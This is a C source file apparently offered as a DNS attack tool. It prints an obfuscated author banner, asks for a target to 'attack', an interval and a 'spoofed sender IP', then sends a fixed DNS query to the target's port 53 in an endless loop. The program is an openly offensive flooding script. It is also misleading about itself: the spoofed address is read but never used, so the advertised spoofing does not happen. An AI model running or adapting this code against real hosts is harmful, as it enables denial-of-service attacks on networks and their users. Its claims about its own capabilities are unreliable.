#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#define YELLOW "\033[1;33m"
#define GREEN "\033[1;32m"
#define RED "\033[1;31m"
#define BLUE "\033[1;34m"
#define CYAN "\033[1;36m"
#define MAGENTA "\033[1;35m"
#define RESET "\033[0m"
#define BOLD "\033[1m"
#define UNDERLINE "\033[4m"

void decode_message(char *encoded, char *decoded) {
    int len = strlen(encoded);
    for (int i = 0; i < len; i++) {
        decoded[i] = encoded[i] - 1; 
    }
    decoded[len] = '\0';
}

void send_dns_query(char *destination, int interval, char *sender_ip) {
    struct sockaddr_in server_addr;
    int sockfd;
     
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(53);
    if (inet_pton(AF_INET, destination, &server_addr.sin_addr) != 1) {
        perror("Invalid destination IP address");
        exit(EXIT_FAILURE);
    }
    
    unsigned char payload[] = {
        0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x03, 0x77, 0x77, 0x77, 0x06, 0x65, 0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65,
        0x03, 0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01
    };
    
    int count = 0;
    while (1) {
        
        if (sendto(sockfd, payload, sizeof(payload), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
            perror("Error sending DNS query");
            close(sockfd);
            exit(EXIT_FAILURE);
        }
         
        count++;
        
        if (count % 50 == 0) {
            printf(GREEN BOLD "----> 50 queries sent <----\n" RESET);
        }
        
        sleep(interval);
    }
    
    close(sockfd);
}

int main() {
    char destination[100];
    int interval;
    char sender_ip[100];
    
    char encoded_msg[] = "xfmdpnf!cz!d0nsbef113";
    char decoded_msg[50];
    decode_message(encoded_msg, decoded_msg);
    
    printf(YELLOW BOLD "%s\n" RESET, decoded_msg);
    
    printf(CYAN "Enter the IP address or domain to attack: " RESET);
    scanf("%s", destination);
    printf(CYAN "Enter the interval between queries (in seconds): " RESET);
    scanf("%d", &interval);
    printf(CYAN "Enter the spoofed sender IP address: " RESET);
    scanf("%s", sender_ip);
    
    printf(MAGENTA "Launching attack on %s with an interval of %d seconds...\n" RESET, destination, interval);
    
    send_dns_query(destination, interval, sender_ip);

    return 0;
}
